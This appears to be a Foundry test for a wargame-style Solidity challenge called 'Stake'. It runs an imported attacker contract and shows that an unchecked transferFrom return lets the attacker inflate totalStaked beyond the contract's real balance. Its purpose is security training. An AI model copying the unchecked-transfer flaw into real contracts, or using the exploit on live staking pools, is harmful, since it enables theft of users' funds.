// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {WETHMock} from "./mock/WETHMock.sol";
import {Stake} from "../src/contracts/31_Stake.sol";
import {StakeAttacker} from "../src/attackers/31_StakeAttacker.sol";

contract StakeTest is Test {
    address private owner = makeAddr("owner");
    address private attacker = makeAddr("attacker");
    WETHMock private wethMock;
    Stake private stake;
    StakeAttacker private stakeAttacker;

    function setUp() public {
        wethMock = new WETHMock("WETHMock", "WETHM");

        vm.prank(owner);
        deal(owner, 0.001 ether + 2);
        stake = new Stake(address(wethMock));
        stake.StakeETH{value: 0.001 ether + 2}();

        vm.prank(attacker);
        stakeAttacker = new StakeAttacker(address(stake), address(wethMock));
    }

    function test_StakeExploitVulnerability() public {
        /*  
            The vulnerability here is that in `Stake::StakeWETH` there is no check whether the transfer was successful
            We get the bool `transfered` after we call the `transferFrom` function but no one checks if it's successful or not
        */

        vm.startPrank(attacker);
        deal(attacker, 0.001 ether + 2);
        stakeAttacker.attack{value: 0.001 ether + 2}();
        vm.stopPrank();

        require(address(stake).balance > 0, "Stake balance must be 0");
        require(
            stake.totalStaked() > address(stake).balance,
            "totalStaked must be grater than stake balance"
        );

        assertTrue(stake.Stakers(address(stakeAttacker)));
        assertEq(stake.UserStake(address(stakeAttacker)), 0);
    }
}
